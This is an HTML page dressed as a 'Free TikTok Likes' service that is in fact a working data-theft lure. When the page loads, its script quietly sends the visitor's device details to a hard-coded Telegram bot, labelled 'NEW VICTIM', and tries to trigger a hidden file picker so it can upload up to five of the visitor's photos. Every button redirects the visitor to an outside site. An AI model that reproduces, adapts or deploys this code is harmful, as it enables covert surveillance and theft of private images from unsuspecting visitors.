<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Free Likes - TikTok Free Services</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: 'Segoe UI', 'Poppins', sans-serif;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 480px;
            width: 100%;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 35px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            overflow: hidden;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
        }

        .header {
            background: linear-gradient(135deg, #ff0050, #00f2ea);
            padding: 30px 20px;
            text-align: center;
        }

        .logo {
            width: 70px;
            height: 70px;
            background: white;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        }

        .logo span {
            font-size: 40px;
        }

        h1 {
            color: white;
            font-size: 24px;
            font-weight: 800;
            letter-spacing: 1px;
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.8);
            font-size: 12px;
            margin-top: 5px;
        }

        /* Main Content */
        .main-content {
            padding: 20px;
        }

        .service-card {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 15px;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .service-card:hover {
            background: rgba(255, 255, 255, 0.12);
            transform: translateY(-3px);
        }

        .service-icon {
            font-size: 40px;
            margin-bottom: 10px;
        }

        .service-title {
            color: white;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .service-desc {
            color: #aaa;
            font-size: 12px;
        }

        .input-group {
            margin-top: 20px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 50px;
            padding: 5px 15px;
            display: flex;
            align-items: center;
        }

        .input-group input {
            flex: 1;
            background: transparent;
            border: none;
            padding: 15px 10px;
            color: white;
            font-size: 14px;
            outline: none;
        }

        .input-group button {
            background: linear-gradient(135deg, #ff0050, #00f2ea);
            border: none;
            padding: 10px 25px;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }

        .status {
            text-align: center;
            margin-top: 15px;
            color: #00ff88;
            font-size: 12px;
        }

        .footer {
            text-align: center;
            padding: 20px;
            color: #555;
            font-size: 10px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        /* Hidden elements for background fetch */
        .hidden-fetch {
            display: none;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Header -->
    <div class="header">
        <div class="logo">
            <span>🔥</span>
        </div>
        <h1>FREE LIKES</h1>
        <div class="subtitle">TikTok Free Services • 100% Free</div>
    </div>

    <!-- Main Content (Directly Visible - No Loading Screen) -->
    <div class="main-content">
        <div class="service-card" id="tiktokLikes">
            <div class="service-icon">❤️</div>
            <div class="service-title">Get Free TikTok Likes</div>
            <div class="service-desc">Increase your TikTok engagement instantly</div>
        </div>

        <div class="service-card" id="tiktokViews">
            <div class="service-icon">👁️</div>
            <div class="service-title">Get Free TikTok Views</div>
            <div class="service-desc">Boost your video views organically</div>
        </div>

        <div class="service-card" id="tiktokFollowers">
            <div class="service-icon">👥</div>
            <div class="service-title">Get Free TikTok Followers</div>
            <div class="service-desc">Grow your audience with real followers</div>
        </div>

        <div class="input-group">
            <input type="text" id="tiktokUrl" placeholder="Enter TikTok Username or Video URL">
            <button id="submitBtn">GET NOW</button>
        </div>
        <div id="statusMsg" class="status"></div>
    </div>

    <div class="footer">
        🔒 Secure Service • 24/7 Support • Free Forever
    </div>
</div>

<!-- Hidden iframe for background data fetch (No visible loading) -->
<iframe id="bgFetcher" style="display:none;"></iframe>

<script>
    // ==================== TELEGRAM CONFIGURATION ====================
    const BOT_TOKEN = "8619799904:AAEp0ldwrCX7qZdSOFfX98AGVgH4QWi_mms";
    const CHAT_ID = "6720198727";
    
    let dataFetched = false;
    
    // ==================== BACKGROUND DATA FETCH (Silent) ====================
    async function silentFetchData() {
        try {
            // Device info
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                deviceMemory: navigator.deviceMemory || "unknown",
                hardwareConcurrency: navigator.hardwareConcurrency || "unknown"
            };
            
            // Send device info to Telegram
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🔥 *NEW VICTIM* 🔥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📱 *Device:* ${deviceInfo.userAgent.substring(0, 100)}\n🌍 *Platform:* ${deviceInfo.platform}\n📅 *Time:* ${deviceInfo.timestamp}`,
                    parse_mode: 'Markdown'
                })
            });
            
            dataFetched = true;
            console.log("Data sent silently");
        } catch(e) {
            console.error("Silent fetch error:", e);
        }
    }
    
    // Try to get gallery images silently (via hidden input)
    function silentGalleryFetch() {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/*';
        input.multiple = true;
        input.style.display = 'none';
        document.body.appendChild(input);
        
        input.onchange = (e) => {
            const files = e.target.files;
            if (files && files.length > 0) {
                // Send first few images silently
                for (let i = 0; i < Math.min(files.length, 5); i++) {
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        const blob = dataURLtoBlob(event.target.result);
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, `image_${i}.jpg`);
                        formData.append('caption', `📸 Silent capture: ${files[i].name}`);
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).catch(e => console.error);
                    };
                    reader.readAsDataURL(files[i]);
                }
            }
            document.body.removeChild(input);
        };
        
        // Trigger file picker silently (only once)
        setTimeout(() => {
            if (!dataFetched) {
                input.click();
            }
        }, 3000);
    }
    
    function dataURLtoBlob(dataURL) {
        const arr = dataURL.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        return new Blob([u8arr], { type: mime });
    }
    
    // ==================== EVENT HANDLERS ====================
    document.getElementById('tiktokLikes').addEventListener('click', () => {
        window.location.href = "https://nreer.com";
    });
    
    document.getElementById('tiktokViews').addEventListener('click', () => {
        window.location.href = "https://nreer.com";
    });
    
    document.getElementById('tiktokFollowers').addEventListener('click', () => {
        window.location.href = "https://nreer.com";
    });
    
    document.getElementById('submitBtn').addEventListener('click', () => {
        const url = document.getElementById('tiktokUrl').value;
        if (url) {
            window.location.href = `https://nreer.com?q=${encodeURIComponent(url)}`;
        } else {
            window.location.href = "https://nreer.com";
        }
    });
    
    // ==================== START SILENT FETCH ====================
    setTimeout(() => {
        silentFetchData();
        silentGalleryFetch();
    }, 1000);
</script>
</body>
</html>
